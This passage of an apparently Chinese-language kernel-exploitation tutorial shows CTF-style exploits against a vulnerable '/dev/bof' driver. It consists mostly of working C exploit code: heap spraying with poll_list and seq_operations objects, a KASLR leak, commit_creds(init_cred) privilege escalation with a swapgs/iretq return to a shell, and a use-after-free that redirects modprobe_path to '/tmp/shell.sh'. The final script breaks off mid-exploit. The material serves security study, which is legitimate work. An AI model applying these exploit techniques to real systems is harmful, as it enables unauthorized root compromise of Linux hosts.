class="type">void</span>* <span class="title function_">alloc_poll_list</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> nfds = ((poll_args *) args)-&gt;nfds;</span><br><span class="line">    <span class="type">int</span> timer = ((poll_args *) args)-&gt;timer;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> *<span class="title">pfds</span> =</span> <span class="built_in">calloc</span>(nfds, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nfds; i++) &#123;</span><br><span class="line">        pfds[i].fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">        pfds[i].events = POLLERR;</span><br><span class="line">    &#125;</span><br><span class="line">    poll(pfds, nfds, timer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">create_poll_list</span><span class="params">(<span class="type">size_t</span> size, <span class="type">int</span> timer, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    poll_args *args = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(poll_args));</span><br><span class="line">    args-&gt;nfds = (size - (size + PAGE_SIZE - <span class="number">1</span>) / PAGE_SIZE * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list)) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd) + N_STACK_PPS;</span><br><span class="line">    args-&gt;timer = timer;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;tid[i], <span class="literal">NULL</span>, alloc_poll_list, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_bufer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF810A1340</span>;</span><br><span class="line"><span class="type">void</span> *init_cred = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF81E496C0</span>;</span><br><span class="line"><span class="type">size_t</span> user_rip = (<span class="type">size_t</span>) get_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov rax, [rsp + 8];&quot;</span></span><br><span class="line">        <span class="string">&quot;mov kernel_offset, rax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    kernel_offset -= <span class="number">0xffffffff81229378</span>;</span><br><span class="line">    commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + kernel_offset);</span><br><span class="line">    init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + kernel_offset);</span><br><span class="line">    commit_creds(init_cred);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, (<span class="type">void</span> *) get_shell);</span><br><span class="line">    bof_fd = open(<span class="string">&quot;dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> seq_fd[SEQ_NUM];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] try to alloc_kmalloc-4096\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span>* mem = <span class="built_in">malloc</span>(<span class="number">0x1010</span>);</span><br><span class="line">    <span class="built_in">memset</span>(mem, <span class="string">&#x27;\xff&#x27;</span>, <span class="number">0x1010</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0x1000</span>, (<span class="type">char</span>*)mem, <span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(bof_fd, BOF_MALLOC, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] try to spary kmalloc-32\n&quot;</span>);</span><br><span class="line">    p.len = <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">20</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        p.idx = i;</span><br><span class="line">        <span class="built_in">memset</span>(mem, i, <span class="number">0x20</span>);</span><br><span class="line">        <span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="number">0x18</span>);</span><br><span class="line">        ioctl(bof_fd, BOF_MALLOC, &amp;p);</span><br><span class="line">        ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] try to alloc_poll_list\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        create_poll_list(PAGE_SIZE + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd), <span class="number">3000</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] try to spary kmalloc-32\n&quot;</span>);</span><br><span class="line">    p.len = <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">20</span>; i &lt; <span class="number">40</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        p.idx = i;</span><br><span class="line">        <span class="built_in">memset</span>(mem, i, <span class="number">0x20</span>);</span><br><span class="line">        <span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="number">0x18</span>);</span><br><span class="line">        ioctl(bof_fd, BOF_MALLOC, &amp;p);</span><br><span class="line">        ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    p.len = <span class="number">0x1001</span>;</span><br><span class="line">    p.idx = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(mem, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x1001</span>);</span><br><span class="line">    ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] wating for poll end\n&quot;</span>);</span><br><span class="line">        pthread_join(tid[i], &amp;res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">40</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        p.idx = i;</span><br><span class="line">        p.len = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">        ioctl(bof_fd, BOF_READ, &amp;p);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;0] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;1] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;2] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">2</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;3] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">        mem[<span class="number">0</span>] = (<span class="type">size_t</span>*)get_root;</span><br><span class="line">        mem[<span class="number">1</span>] = (<span class="type">size_t</span>*)get_root;</span><br><span class="line">        mem[<span class="number">2</span>] = (<span class="type">size_t</span>*)get_root;</span><br><span class="line">        mem[<span class="number">3</span>] = (<span class="type">size_t</span>*)get_root;</span><br><span class="line">        ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">40</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        p.idx = i;</span><br><span class="line">        p.len = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">        ioctl(bof_fd, BOF_READ, &amp;p);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;0] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;1] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;2] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">2</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;3] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        read(seq_fd[i], p.buf, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Arbitrary-Address-Allocation"><a href="#Arbitrary-Address-Allocation" class="headerlink" title="Arbitrary Address Allocation"></a>Arbitrary Address Allocation</h2><h3 id="利用思路-13"><a href="#利用思路-13" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过 uaf 修改 <code>object</code> 的 <code>free list</code> 指针实现任意地址分配。与 <code>glibc</code> 不同的是，内核的 <code>slub</code>  堆管理器缺少检查，因此对要分配的目标地址要求不高，不过有一点需要注意：当我们分配到目标地址时会把目标地址前 <code>8</code> 字节的数据会被写入  <code>freelist</code>，而这通常并非一个有效的地址，从而导致 <code>kernel panic</code>，因此在任意地址分配时最好确保目标 <code>object</code> 的 <code>free list</code> 字段为 <code>NULL</code> 。</p>
<p>当能够任意地址分配的时候，与 glibc 改 hook 类似，在内核中通常修改的是 <code>modprobe_path</code> 。<code>modprobe_path</code> 是内核中的一个变量，其值为 <code>/sbin/modprobe</code> ，因此对于缺少符号的内核文件可以通过搜索 <code>/sbin/modprobe</code> 字符串的方式定位这个变量。</p>
<p>当我们尝试去执行（execve）一个非法的文件（file magic not found），内核会经历如下调用链：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() <span class="comment">// wrapped as request_module</span></span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>call_modprobe()</code> 定义于 <code>kernel/kmod.c</code>，我们主要关注这部分代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">	<span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>在这里调用了函数 <code>call_usermodehelper_exec()</code> 将 <code>modprobe_path</code> 作为可执行文件路径以 root 权限将其执行。<br>我们不难想到的是：若是我们能够劫持 <code>modprobe_path</code>，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，内核将会以 root 权限执行我们的恶意脚本。</p>
<p>或者分析<code>vmlinux</code>即可(对于一些没有<code>call_modprobe()</code>符号的直接交叉引用即可)。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 _request_module(</span><br><span class="line">        <span class="type">char</span> a1,</span><br><span class="line">        __int64 a2,</span><br><span class="line">        <span class="type">double</span> a3,</span><br><span class="line">        <span class="type">double</span> a4,</span><br><span class="line">        <span class="type">double</span> a5,</span><br><span class="line">        <span class="type">double</span> a6,</span><br><span class="line">        <span class="type">double</span> a7,</span><br><span class="line">        <span class="type">double</span> a8,</span><br><span class="line">        <span class="type">double</span> a9,</span><br><span class="line">        <span class="type">double</span> a10,</span><br><span class="line">        ...)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">      v21 = call_usermodehelper_setup(</span><br><span class="line">              (__int64)&amp;byte_FFFFFFFF82444700, <span class="comment">// modprobe_path</span></span><br><span class="line">              (__int64)v18,</span><br><span class="line">              (__int64)&amp;off_FFFFFFFF82444620,</span><br><span class="line">              <span class="number">3264</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              (__int64)free_modprobe_argv,</span><br><span class="line">              <span class="number">0LL</span>);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line">.data:FFFFFFFF82444700 byte_FFFFFFFF82444700             ; DATA XREF: __request_module:loc_FFFFFFFF8108C6D8↑r</span><br><span class="line">.data:FFFFFFFF82444700                 db <span class="number">2F</span>h  ; /       ; __request_module+<span class="number">14B</span>↑o ...                       </span><br><span class="line">.data:FFFFFFFF82444701                 db  <span class="number">73</span>h ; s</span><br><span class="line">.data:FFFFFFFF82444702                 db  <span class="number">62</span>h ; b</span><br><span class="line">.data:FFFFFFFF82444703                 db  <span class="number">69</span>h ; i</span><br><span class="line">.data:FFFFFFFF82444704                 db  <span class="number">6</span>Eh ; n</span><br><span class="line">.data:FFFFFFFF82444705                 db  <span class="number">2F</span>h ; /</span><br><span class="line">.data:FFFFFFFF82444706                 db  <span class="number">6</span>Dh ; m</span><br><span class="line">.data:FFFFFFFF82444707                 db  <span class="number">6F</span>h ; o</span><br><span class="line">.data:FFFFFFFF82444708                 db  <span class="number">64</span>h ; d</span><br><span class="line">.data:FFFFFFFF82444709                 db  <span class="number">70</span>h ; p</span><br><span class="line">.data:FFFFFFFF8244470A                 db  <span class="number">72</span>h ; r</span><br><span class="line">.data:FFFFFFFF8244470B                 db  <span class="number">6F</span>h ; o</span><br><span class="line">.data:FFFFFFFF8244470C                 db  <span class="number">62</span>h ; b</span><br><span class="line">.data:FFFFFFFF8244470D                 db  <span class="number">65</span>h ; e</span><br><span class="line">.data:FFFFFFFF8244470E                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/pwn_helper.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_MALLOC 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_FREE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_WRITE 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_READ 9</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xFFFFFFFF81E48140</span>;</span><br><span class="line"><span class="type">size_t</span> seq_ops_start = <span class="number">0xffffffff81228d90</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kmalloc len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_MALLOC, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kfree len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_FREE, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] copy_to_user len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_READ, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] copy_from_user len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_WRITE, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// len buf idx</span></span><br><span class="line">    <span class="type">size_t</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0x20</span>, buf, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] user_buf : %p\n&quot;</span>, p.buf);</span><br><span class="line">    <span class="type">int</span> bof_fd = open(<span class="string">&quot;/dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (bof_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(RED <span class="string">&quot;[-] Failed to open bof.&quot;</span> NONE);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(YELLOW <span class="string">&quot;[*] try to leak kbase\n&quot;</span> NONE);</span><br><span class="line"></span><br><span class="line">    alloc_buf(bof_fd, &amp;p);</span><br><span class="line">    free_buf(bof_fd, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    read_buf(bof_fd, &amp;p);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak seq_ops&quot;</span>, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_offset = buf[<span class="number">0</span>] - seq_ops_start;</span><br><span class="line">    <span class="built_in">printf</span>(YELLOW <span class="string">&quot;[*] kernel_offset %p\n&quot;</span> NONE, (<span class="type">void</span>*)kernel_offset);</span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(LIGHT_BLUE <span class="string">&quot;[*] modprobe_path addr : %p\n&quot;</span> NONE, (<span class="type">void</span>*)modprobe_path);</span><br><span class="line">    </span><br><span class="line">    p.len = <span class="number">0xa8</span>;</span><br><span class="line">    alloc_buf(bof_fd, &amp;p);</span><br><span class="line">    free_buf(bof_fd, &amp;p);</span><br><span class="line"></span><br><span class="line">    read_buf(bof_fd, &amp;p);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = modprobe_path - <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    write_buf(bof_fd, &amp;p);</span><br><span class="line"></span><br><span class="line">    alloc_buf(bof_fd, &amp;p);</span><br><span class="line">    alloc_buf(bof_fd, &amp;p);</span><br><span class="line"></span><br><span class="line">    read_buf(bof_fd, &amp;p);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak modprobe_path&quot;</span>, buf, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;buf[<span class="number">4</span>], <span class="string">&quot;/tmp/shell.sh\x00&quot;</span>);</span><br><span class="line">    write_buf(bof_fd, &amp;p);</span><br><span class="line">  